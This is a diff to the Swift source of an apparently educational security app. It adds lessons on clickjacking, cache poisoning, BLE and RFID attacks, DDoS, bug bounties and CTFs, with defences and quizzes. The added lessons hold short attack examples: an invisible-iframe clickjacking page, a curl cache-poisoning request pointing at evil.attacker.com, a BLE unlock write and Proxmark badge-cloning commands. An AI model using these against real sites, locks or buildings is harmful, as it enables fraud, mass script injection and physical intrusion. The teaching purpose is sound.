@@ -352,7 +352,133 @@ uid=33(www-data) gid=33(www-data)
         title: "Web Application Attacks",
         summary: "The internet's biggest attack surface — injection, broken access control, file disclosure & upload, template/deserialization RCE, request forgery, token attacks, modern APIs and OAuth, subdomain takeover, request smuggling, race conditions, and the white-box review that finds them.",
         systemImage: "globe",
-        lessons: [sqliLesson, xssLesson, cmdiLesson, accessControlLesson, fileInclusionLesson, fileUploadLesson, webAdvancedLesson, csrfLesson, jwtLesson, apiLesson, oauthLesson, subdomainLesson, smugglingLesson, raceLesson, sourceReviewLesson]
+        lessons: [sqliLesson, xssLesson, cmdiLesson, accessControlLesson, fileInclusionLesson, fileUploadLesson, webAdvancedLesson, csrfLesson, clickjackingLesson, jwtLesson, apiLesson, oauthLesson, subdomainLesson, smugglingLesson, cachePoisoningLesson, raceLesson, sourceReviewLesson]
+    )
+
+    private static let clickjackingLesson = Lesson(
+        id: "red-clickjacking",
+        title: "Clickjacking & UI Redress",
+        subtitle: "The victim sees a harmless button — but their click lands on an invisible frame doing something else entirely.",
+        minutes: 8,
+        difficulty: .intermediate,
+        blocks: [
+            .heading("Stealing a click"),
+            .paragraph("Clickjacking (UI redress) tricks a user into clicking something different from what they perceive. The attacker loads the *real* target site in a transparent `<iframe>` and positions a tempting decoy (\"Play\", \"Claim prize\") exactly beneath the genuine sensitive button (\"Transfer\", \"Delete account\", \"Authorize app\"). The victim is logged in, so their cookies ride along — and their click executes a real, authenticated action they never intended."),
+            .animation(.clickjacking, caption: "A friendly green button hides a real bank-transfer frame at low opacity. Watch the cursor click the decoy — and the hidden action fires."),
+            .code(language: "html", """
+<style>
+  iframe { opacity: 0; position: absolute; top: 0; left: 0;
+           width: 500px; height: 400px; z-index: 2; }
+  #decoy { position: absolute; top: 180px; left: 120px; z-index: 1; }
+</style>
+<div id="decoy">🎁 Click to claim your prize!</div>
+<iframe src="https://bank.example/transfer?to=attacker&amt=5000"></iframe>
+"""),
+            .keyPoints([
+                "The target page is framed invisibly and stacked over a decoy.",
+                "It abuses the victim's existing logged-in session — no credentials needed.",
+                "Variants: likejacking, cursorjacking, and drag-and-drop data theft.",
+                "Root cause: the app lets itself be embedded in a frame on any origin."
+            ]),
+            .definition(term: "Frame busting", meaning: "Old JavaScript that tried to break out of being framed (`if (top !== self) top.location = self.location`). Fragile and bypassable — replaced by HTTP headers the browser enforces."),
+            .callout(.lab, "The fix is server-side and decisive: send `X-Frame-Options: DENY` (or `SAMEORIGIN`), or better, a Content-Security-Policy `frame-ancestors 'none'`. The browser then refuses to render your page inside anyone else's frame, and the attack has nothing to overlay."),
+            .callout(.warning, "Sensitive actions should also require a deliberate, un-spoofable confirmation — re-authentication, a typed amount, or a CAPTCHA — so a single hijacked click can't complete them."),
+            .checkpoint(QuizQuestion(
+                "What makes clickjacking work without the attacker ever stealing a password?",
+                options: [
+                    "It cracks the session token",
+                    "The victim is already authenticated, so their click carries their live session",
+                    "It disables the firewall",
+                    "It reads the victim's cookies via JavaScript"
+                ],
+                correct: 1,
+                why: "The framed page uses the victim's own logged-in session. The attacker just redirects a click onto a real authenticated action — no credential theft involved."))
+        ],
+        quiz: [
+            QuizQuestion(
+                "Which response header most directly prevents clickjacking?",
+                options: [
+                    "Strict-Transport-Security",
+                    "Content-Security-Policy: frame-ancestors 'none' (or X-Frame-Options)",
+                    "Set-Cookie: HttpOnly",
+                    "Cache-Control: no-store"
+                ],
+                correct: 1,
+                why: "frame-ancestors / X-Frame-Options tell the browser whether the page may be embedded in a frame. Denying framing removes the attacker's ability to overlay it."),
+            QuizQuestion(
+                "Clickjacking is best categorised as an attack on…",
+                options: [
+                    "The server's database",
+                    "The user's perception and intent (the UI), abusing their session",
+                    "The TLS handshake",
+                    "DNS resolution"
+                ],
+                correct: 1,
+                why: "It manipulates what the user thinks they're interacting with — redressing the UI — to make them perform an action with their own authenticated session.")
+        ]
+    )
+
+    private static let cachePoisoningLesson = Lesson(
+        id: "red-cache-poisoning",
+        title: "Web Cache Poisoning",
+        subtitle: "Get the shared cache to store your malicious response once — and it serves it to every visitor after you.",
+        minutes: 10,
+        difficulty: .advanced,
+        blocks: [
+            .heading("Poison once, hit everyone"),
+            .paragraph("Caches (CDNs, reverse proxies) speed sites up by storing a response under a **cache key** — usually the method, host and path — and replaying it for the next person who asks for the same key. Web cache poisoning happens when an *unkeyed* input (a header the cache ignores when building the key but the app still reflects into the response) lets an attacker bake a payload into a cached page. The cache then serves that poisoned copy to every subsequent visitor."),
+            .animation(.cachePoisoning, caption: "An attacker's X-Forwarded-Host header is reflected into a cacheable response. The cache stores it — then serves the attacker's script to every visitor."),
+            .terminal(prompt: "kali@lab",
+                      command: "curl https://shop.example/ -H 'X-Forwarded-Host: evil.attacker.com'",
+                      output: """
+HTTP/1.1 200 OK
+X-Cache: miss
+...
+<script src="//evil.attacker.com/x.js"></script>   <-- reflected & now cached
+"""),
+            .keyPoints([
+                "Find an unkeyed input that changes the response (X-Forwarded-Host, X-Host, weird headers).",
+                "Confirm the response is cacheable — look at Cache-Control, Age and X-Cache headers.",
+                "Get the poisoned response stored, then prove a clean request returns it (X-Cache: hit).",
+                "Impact: stored XSS, redirects, or denial of service — to everyone hitting that key.",
+                "Cache *deception* is the cousin: trick the cache into storing a victim's private page."
+            ]),
+            .definition(term: "Cache key", meaning: "The set of request components a cache uses to decide whether two requests are 'the same' (typically host + path + maybe a few headers). Inputs outside the key are 'unkeyed' — invisible to the cache but sometimes very visible to the app."),
+            .callout(.warning, "The blast radius is the entire user base of that URL, not one victim. A single reflected `<script>` in a cached home page is mass stored-XSS."),
+            .callout(.lab, "Defence: include every input that influences the response in the cache key (or strip/normalise unkeyed headers at the edge), never reflect untrusted headers into responses, and mark genuinely user-specific pages `Cache-Control: private, no-store`."),
+            .checkpoint(QuizQuestion(
+                "What property must a response have for cache poisoning to affect other users?",
+                options: [
+                    "It must be encrypted",
+                    "It must be cacheable and stored under a key other victims will also request",
+                    "It must set a cookie",
+                    "It must be larger than 1 MB"
+                ],
+                correct: 1,
+                why: "Poisoning only spreads if the malicious response gets cached under a shared key. Then anyone requesting that key is handed the attacker's stored copy."))
+        ],
+        quiz: [
+            QuizQuestion(
+                "An 'unkeyed input' in cache poisoning is…",
+                options: [
+                    "A password field",
+                    "A request input the cache ignores for keying but the app still reflects into the response",
+                    "An encryption key the cache lost",
+                    "A cookie set by the server"
+                ],
+                correct: 1,
+                why: "Unkeyed inputs don't change which cache entry is used, yet can change the entry's contents — exactly the gap an attacker bakes a payload into."),
+            QuizQuestion(
+                "Which header tells you a response came from the cache rather than the origin?",
+                options: [
+                    "Content-Type",
+                    "An X-Cache: hit (or a non-zero Age) header",
+                    "Set-Cookie",
+                    "User-Agent"
+                ],
+                correct: 1,
+                why: "X-Cache: hit / a growing Age value indicate the cache, not the origin, answered — the confirmation that your poisoned entry is being replayed.")
+        ]
     )
 
     private static let sqliLesson = Lesson(
@@ -1821,9 +1947,188 @@ Build started. <-- attacker C# in the .xml runs, fully whitelisted
     private static let wireless = Module(
         id: "red-wireless",
         title: "Wireless & Network Attacks",
-        summary: "Step onto the local network — crack Wi-Fi, and poison the protocols that quietly trust each other.",
+        summary: "Step onto the local network — crack Wi-Fi, abuse short-range radio and access cards, poison the protocols that quietly trust each other, and drown a target offline.",
         systemImage: "wifi",
-        lessons: [wifiLesson, mitmLesson]
+        lessons: [wifiLesson, mitmLesson, bleLesson, rfidLesson, ddosLesson]
+    )
+
+    private static let bleLesson = Lesson(
+        id: "red-bluetooth",
+        title: "Bluetooth & BLE Attacks",
+        subtitle: "Smart locks, trackers, earbuds and medical devices talk over the air — and a lot of them never bothered to encrypt it.",
+        minutes: 9,
+        difficulty: .intermediate,
+        blocks: [
+            .heading("The short-range attack surface"),
+            .paragraph("Bluetooth Low Energy (BLE) powers the explosion of cheap IoT: locks, fitness bands, beacons, toys, even insulin pumps. A BLE peripheral *advertises* itself, a central (your phone) connects, and they exchange data through a **GATT** table of services and characteristics. The recurring flaw is that many devices send sensitive commands — \"unlock\", \"set value\" — in cleartext with weak or no pairing, so anyone with a $10 radio can listen and talk back."),
+            .animation(.bleAttack, caption: "A phone unlocks a smart lock with a plaintext BLE command; an attacker's sniffer captures it and replays it verbatim to open the lock."),
+            .terminal(prompt: "kali@lab",
+                      command: "sudo bettercap -eval 'ble.recon on'\n# enumerate the GATT table, then write to the unlock characteristic\ngatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x002b -n 01",
+                      output: """
+[ble] device discovered  AA:BB:CC:DD:EE:FF  SmartLock-3F
+  ↳ svc 0xFFE0  char 0x002b  WRITE  (no auth)
+Characteristic value was written successfully
+"""),
+            .keyPoints([
+                "Advertising — devices broadcast presence (and often a guessable name) constantly.",
+                "GATT — services → characteristics; the read/write handles you actually attack.",
+                "Sniffing — cheap hardware (nRF52, Ubertooth) captures BLE off the air.",
+                "Replay — re-send a captured command if there's no nonce/rolling counter.",
+                "MAC randomisation and 'Just Works' pairing are common, weak defaults."
+            ]),
+            .definition(term: "GATT", meaning: "Generic Attribute Profile — the data model BLE devices expose: a tree of services, each holding characteristics (values you can read, write or subscribe to). Enumerating it is BLE recon."),
+            .callout(.warning, "BLE 'Just Works' pairing offers no man-in-the-middle protection — it's encryption with an unauthenticated key exchange. Convenient, and exactly why so many devices fall to a sniff-and-replay."),
+            .callout(.lab, "Defences: authenticated pairing (Passkey/Numeric Comparison), application-layer encryption with a fresh nonce or rolling counter per command (kills replay), and short, randomised connection windows. Test only devices you own."),
+            .checkpoint(QuizQuestion(
+                "Why does a replay attack succeed against many BLE locks?",
+                options: [
+                    "BLE has no range limit",
+                    "The unlock command has no per-message nonce/counter, so a captured packet stays valid",
+                    "Phones leak the password",
+                    "BLE always uses HTTP"
+                ],
+                correct: 1,
+                why: "Without a changing value (nonce/rolling counter) bound to each command, a captured 'unlock' packet is indistinguishable from a fresh one — so replaying it works."))
+        ],
+        quiz: [
+            QuizQuestion(
+                "In BLE, what is the GATT table?",
+                options: [
+                    "The encryption key store",
+                    "The hierarchy of services and characteristics a device exposes to read/write",
+                    "The Wi-Fi handshake",
+                    "A list of paired phones"
+                ],
+                correct: 1,
+                why: "GATT defines the device's data model — services and their characteristics. Enumerating it reveals the handles an attacker (or app) reads and writes."),
+            QuizQuestion(
+                "Which control most directly defeats BLE command replay?",
+                options: [
+                    "A longer device name",
+                    "A rolling counter or fresh nonce bound to each command",
+                    "Hiding the MAC address",
+                    "Increasing transmit power"
+                ],
+                correct: 1,
+                why: "If each command includes a value that changes every time and the device rejects repeats, a captured packet can't be replayed — the core fix.")
+        ]
+    )
+
+    private static let rfidLesson = Lesson(
+        id: "red-rfid",
+        title: "RFID, NFC & Physical Access",
+        subtitle: "The badge that opens the office door is often just a number anyone standing near you can copy.",
+        minutes: 9,
+        difficulty: .intermediate,
+        blocks: [
+            .heading("Cloning the key to the building"),
+            .paragraph("Most physical-access systems use RFID cards. Low-frequency (125 kHz) badges like HID Prox broadcast a static ID with **no authentication at all** — read it once and you can write an identical clone. High-frequency (13.56 MHz) NFC cards (MIFARE Classic) added crypto, but it was broken years ago. Either way, a reader hidden in a bag, brushed near a victim's pocket, can lift the credential — and a blank card or a Flipper Zero becomes a working master key."),
+            .animation(.rfidClone, caption: "A covert reader lifts a badge's UID, writes it to a blank card, and the clone opens the door — the textbook prox-card attack."),
+            .terminal(prompt: "proxmark3",
+                      command: "lf hid read\nlf hid clone -w H10301 --fc 123 --cn 4567",
+                      output: """
+[+] HID Prox TAG ID: 2004263f88 (fc 123 cn 4567)
+[=] Cloning HID Prox to T55x7 tag...
+[+] Done — clone matches original
+"""),
+            .keyPoints([
+                "125 kHz (HID Prox, EM4100) — static ID, no auth: trivially cloneable.",
+                "13.56 MHz (MIFARE Classic) — Crypto1 cipher broken; keys recoverable.",
+                "Tools — Proxmark3, Flipper Zero, ChameleonMini; long-range readers exist.",
+                "Tailgating & USB drops — the cheapest 'exploit' is often a held-open door.",
+                "Pair card cloning with a cloned badge photo for full physical pretext."
+            ]),
+            .definition(term: "Tailgating", meaning: "Following an authorised person through a secured door before it closes — defeating any access-control technology by exploiting politeness. The reason mantraps and turnstiles exist."),
+            .callout(.warning, "A static-ID prox card is a password printed on the outside of your building. Treat the badge number as public — security must come from a second factor, not the card alone."),
+            .callout(.lab, "Defences: move to authenticated smartcards (MIFARE DESFire EV3, SEOS) with mutual auth and rotating keys; add a PIN or biometric for sensitive doors; deploy anti-tailgating (mantraps, turnstiles) and visitor escorts. Only test badges and facilities you're authorised to."),
+            .checkpoint(QuizQuestion(
+                "Why is a 125 kHz HID Prox card so easy to clone?",
+                options: [
+                    "It uses weak encryption",
+                    "It transmits a static identifier with no authentication, so reading it is enough to copy it",
+                    "It needs the building's Wi-Fi password",
+                    "It only works at long range"
+                ],
+                correct: 1,
+                why: "Low-frequency prox cards just announce a fixed number with no challenge-response. Capture that number and you can write an identical card."))
+        ],
+        quiz: [
+            QuizQuestion(
+                "MIFARE Classic improved on prox cards by adding crypto. Why is it still attackable?",
+                options: [
+                    "It has no antenna",
+                    "Its Crypto1 cipher and key handling were broken, letting attackers recover keys and clone cards",
+                    "It only stores one bit",
+                    "It requires the internet"
+                ],
+                correct: 1,
+                why: "The proprietary Crypto1 cipher was reverse-engineered and broken; practical attacks recover the sector keys, so MIFARE Classic is no longer trustworthy for access control."),
+            QuizQuestion(
+                "Which control defeats tailgating, regardless of card technology?",
+                options: [
+                    "A stronger cipher on the card",
+                    "Physical anti-passback controls like mantraps or turnstiles",
+                    "A longer badge ID",
+                    "Disabling NFC on phones"
+                ],
+                correct: 1,
+                why: "Tailgating bypasses the credential entirely by following someone in. Only physical controls that admit one person per authentication stop it.")
+        ]
+    )
+
+    private static let ddosLesson = Lesson(
+        id: "red-ddos",
+        title: "DoS, DDoS & Amplification",
+        subtitle: "Sometimes the goal isn't to break in — it's to make sure nobody else can get in either.",
+        minutes: 9,
+        difficulty: .intermediate,
+        blocks: [
+            .heading("Attacking availability"),
+            .paragraph("The 'A' in the CIA triad is **Availability**, and denial-of-service attacks it directly. A DoS exhausts a resource — bandwidth, CPU, memory, connection tables — so legitimate users can't be served. A **DDoS** does it from thousands of sources at once (a botnet), making it far harder to block. The nastiest variants are *reflection/amplification* attacks, where the attacker turns small packets into a tidal wave using innocent third-party servers."),
+            .animation(.ddosAmplification, caption: "The attacker spoofs the victim's source address so open resolvers fire huge replies at the victim — a 64-byte query returns a 3,200-byte flood."),
+            .keyPoints([
+                "Volumetric — raw bandwidth flooding (UDP/ICMP floods) saturates the pipe.",
+                "Protocol — SYN floods exhaust connection-tracking state with half-open handshakes.",
+                "Application-layer (L7) — slow or expensive requests (Slowloris, HTTP floods) starve the app.",
+                "Reflection — spoof the victim's IP so a third party replies *to the victim*.",
+                "Amplification — pick services where the reply dwarfs the request (DNS, NTP, memcached)."
+            ]),
+            .definition(term: "Amplification factor", meaning: "The ratio of response size to request size for a reflected protocol. DNS ANY ≈ 50×, NTP monlist ≈ 550×, memcached ≈ 50,000×. A tiny outbound trickle becomes a massive inbound flood on the victim."),
+            .callout(.danger, "Launching a DoS against systems you don't own is a serious crime in most jurisdictions (e.g. the US CFAA, UK Computer Misuse Act) — and a stress-test of your own infra needs written authorisation. This lesson is about understanding and defending against it."),
+            .callout(.lab, "Defences: anti-spoofing at the network edge (BCP 38 ingress filtering kills reflection), upstream scrubbing/CDN absorption, SYN cookies, rate limiting and connection caps, and never running open DNS/NTP resolvers that others can abuse as reflectors."),
+            .checkpoint(QuizQuestion(
+                "What makes an amplification attack so effective for the attacker?",
+                options: [
+                    "It encrypts the victim's data",
+                    "A small spoofed request triggers a much larger response sent to the victim",
+                    "It steals the victim's password",
+                    "It only uses the attacker's own bandwidth"
+                ],
+                correct: 1,
+                why: "By spoofing the victim's address to a service whose replies are far bigger than the queries, the attacker multiplies their bandwidth many times over onto the target."))
+        ],
+        quiz: [
+            QuizQuestion(
+                "Which defence most directly stops reflection/amplification attacks at their source?",
+                options: [
+                    "Stronger passwords",
+                    "BCP 38 ingress filtering, which blocks spoofed source addresses leaving a network",
+                    "TLS everywhere",
+                    "Longer DNS TTLs"
+                ],
+                correct: 1,
+                why: "Reflection depends on spoofing the victim's source IP. Ingress filtering (BCP 38) drops packets with forged source addresses before they leave the origin network, breaking the technique."),
+            QuizQuestion(
+                "A SYN flood is best described as which type of DoS?",
+                options: [
+                    "Application-layer",
+                    "A protocol attack that exhausts the connection-tracking state with half-open handshakes",
+                    "An amplification attack",
+                    "A phishing attack"
+                ],
+                correct: 1,
+                why: "A SYN flood sends many SYNs without completing the handshake, filling the server's table of half-open connections — a state-exhaustion (protocol) attack, countered by SYN cookies.")
+        ]
     )
 
     private static let wifiLesson = Lesson(
@@ -2644,9 +2949,122 @@ host# id  ->  uid=0(root)   # root on the NODE
     private static let fieldManual = Module(
         id: "red-field-manual",
         title: "The Operator's Field Manual",
-        summary: "The two practical guides every learner needs around the techniques: how to build a safe lab to practise in, and how to turn an engagement into a report that gets findings fixed.",
+        summary: "The practical guides around the techniques: build a safe lab, turn an engagement into a report that gets fixed, earn legally through bug bounties, and sharpen your skills on CTFs.",
         systemImage: "book.closed.fill",
-        lessons: [labLesson, reportLesson]
+        lessons: [labLesson, reportLesson, bugBountyLesson, ctfLesson]
+    )
+
+    private static let bugBountyLesson = Lesson(
+        id: "red-bugbounty",
+        title: "Bug Bounty: Hunt, Triage & Report",
+        subtitle: "The legal way to hack real companies, get paid, and build a name — if you read the rules and write a report they can act on.",
+        minutes: 10,
+        difficulty: .intermediate,
+        blocks: [
+            .heading("Hacking with permission, at scale"),
+            .paragraph("A bug bounty program is a standing invitation: a company publishes a **scope** and **rules of engagement** on a platform (HackerOne, Bugcrowd, Intigriti, or a self-hosted page) and pays researchers who responsibly report valid vulnerabilities. It's the bridge between learning labs and professional work — real targets, real impact, real money, and a public profile that opens doors. The catch: everything hinges on staying inside scope and writing reports triagers can reproduce."),
+            .heading("Read the scope before you touch anything"),
+            .paragraph("The scope is law. It lists which domains, apps and IP ranges are fair game (*in scope*), what's forbidden (*out of scope* — often production data, DoS, social engineering, third-party services), and which bug classes the program does and doesn't reward. Testing out of scope isn't research — it can be a crime, and it gets you banned. When in doubt, ask, or pick a target that explicitly invites testing."),
+            .keyPoints([
+                "Pick a program with a wide scope and a clear, recently-updated policy.",
+                "Map the attack surface: subdomains, JS files, APIs, parameters, old endpoints.",
+                "Hunt where others don't look — business logic, access control, race conditions.",
+                "Always check for duplicates; first valid report wins the bounty.",
+                "Respect rate limits and never exfiltrate real user data — prove impact minimally."
+            ]),
+            .definition(term: "Rules of Engagement (RoE)", meaning: "The binding terms of a program: in-scope targets, prohibited techniques (DoS, automated scanning limits, no real PII), testing accounts to use, and the safe-harbor clause promising they won't pursue legal action for good-faith testing within scope."),
+            .callout(.tip, "A great report is worth more than a great bug. Structure every submission as: clear title → affected asset → step-by-step reproduction → proof (request/response, screenshot, minimal PoC) → real-world impact → suggested fix. Make the triager's job effortless and you get paid faster."),
+            .callout(.danger, "Safe harbor only covers testing inside the published scope and rules. The moment you stray out of scope, pivot into internal systems, or access other users' real data, you lose that protection — and the legal exposure is on you."),
+            .checkpoint(QuizQuestion(
+                "Before testing a target in a bug bounty program, the single most important thing to check is…",
+                options: [
+                    "The company's stock price",
+                    "The scope and rules of engagement — what's in scope and what's forbidden",
+                    "Whether the site uses HTTPS",
+                    "The CEO's email address"
+                ],
+                correct: 1,
+                why: "Scope defines what you're legally allowed to test. Working outside it forfeits safe harbor and can be a crime, no matter how good the bug is."))
+        ],
+        quiz: [
+            QuizQuestion(
+                "Two researchers find the same bug. Who is typically rewarded?",
+                options: [
+                    "Both equally",
+                    "The first to submit a valid, reproducible report (the duplicate is closed)",
+                    "Whoever has more reputation",
+                    "Neither"
+                ],
+                correct: 1,
+                why: "Bounties go to the first valid report; later identical findings are marked duplicate. Speed and a clear write-up matter as much as the discovery."),
+            QuizQuestion(
+                "What does a program's 'safe harbor' clause give a researcher?",
+                options: [
+                    "Unlimited scope",
+                    "A promise of no legal action for good-faith testing that stays within the published rules",
+                    "A guaranteed payout",
+                    "Access to the source code"
+                ],
+                correct: 1,
+                why: "Safe harbor protects good-faith research conducted within scope. It does not extend to out-of-scope testing, data theft, or rule violations.")
+        ]
+    )
+
+    private static let ctfLesson = Lesson(
+        id: "red-ctf",
+        title: "CTF Survival Guide",
+        subtitle: "Capture The Flag is the gym for hackers — structured puzzles that build the exact reflexes the rest of this app teaches.",
+        minutes: 9,
+        difficulty: .foundational,
+        blocks: [
+            .heading("Learning by capturing flags"),
+            .paragraph("A Capture The Flag is a hacking competition where each challenge hides a **flag** — a string like `flag{y0u_found_me}` — that you submit for points. CTFs are the fastest, safest, most addictive way to practise: every challenge is deliberately vulnerable and explicitly authorised, so you can attack with abandon. They turn the abstract techniques in this app into muscle memory under a bit of friendly pressure."),
+            .heading("The two formats"),
+            .paragraph("**Jeopardy** style is a board of standalone challenges grouped by category — pick one, solve it, submit the flag. **Attack-Defense** style gives each team an identical vulnerable network: you patch your own services while exploiting everyone else's, live. Beginners should start with Jeopardy events (picoCTF is the classic on-ramp) before touching attack-defense."),
+            .keyPoints([
+                "Web — the injection, access-control and SSRF bugs from the web module.",
+                "Pwn / binary — buffer overflows, ROP, format strings (the binexp track).",
+                "Crypto — broken ciphers, padding oracles, weak RNG and bad key reuse.",
+                "Reversing — disassemble a binary to recover the logic or a hard-coded key.",
+                "Forensics / stego — carve files, read packet captures, extract hidden data.",
+                "OSINT — find the flag from public information about a person or place."
+            ]),
+            .definition(term: "Flag", meaning: "The proof-of-solve token for a challenge, usually wrapped in a recognisable format like `flag{...}` or `CTF{...}`. Finding it means you completed the intended exploit (or an unintended shortcut — equally valid)."),
+            .callout(.tip, "Stuck? Work the checklist, not the panic. Re-read the prompt for hints, enumerate harder (you missed something), try the category's standard tools, and check the challenge files with `file`/`strings`/`binwalk`. Most 'impossible' challenges fall to one overlooked detail."),
+            .callout(.lab, "Start now: picoCTF (beginner, always-on), OverTheWire Bandit (Linux/SSH basics), Hack The Box and TryHackMe (guided machines), and CTFtime.org to find live competitions. Keep a notes file of every trick — your future self will reuse it constantly."),
+            .checkpoint(QuizQuestion(
+                "What is a 'flag' in a CTF?",
+                options: [
+                    "A penalty for cheating",
+                    "A secret token you recover by solving a challenge and submit for points",
+                    "The team's name",
+                    "A type of firewall"
+                ],
+                correct: 1,
+                why: "The flag is the proof you solved the challenge — typically a formatted string like flag{...} hidden behind the intended (or an unintended) exploit."))
+        ],
+        quiz: [
+            QuizQuestion(
+                "Which CTF format is the best starting point for a beginner?",
+                options: [
+                    "Attack-Defense, for the live pressure",
+                    "Jeopardy-style events like picoCTF, with standalone categorised challenges",
+                    "Only real-world bug bounties",
+                    "None — read theory first"
+                ],
+                correct: 1,
+                why: "Jeopardy events let you pick isolated, well-scoped challenges at your level. Attack-defense demands simultaneous offense and defense — overwhelming until you have the fundamentals."),
+            QuizQuestion(
+                "You're handed an unknown file in a forensics challenge. A strong first step is to…",
+                options: [
+                    "Submit a random flag",
+                    "Run file, strings and binwalk to identify its type and surface hidden/appended data",
+                    "Delete it",
+                    "Email the organisers"
+                ],
+                correct: 1,
+                why: "Identifying the file type and scanning for embedded strings or appended data with file/strings/binwalk is the standard, high-yield opening move in forensics and stego challenges.")
+        ]
     )
 
     private static let labLesson = Lesson(
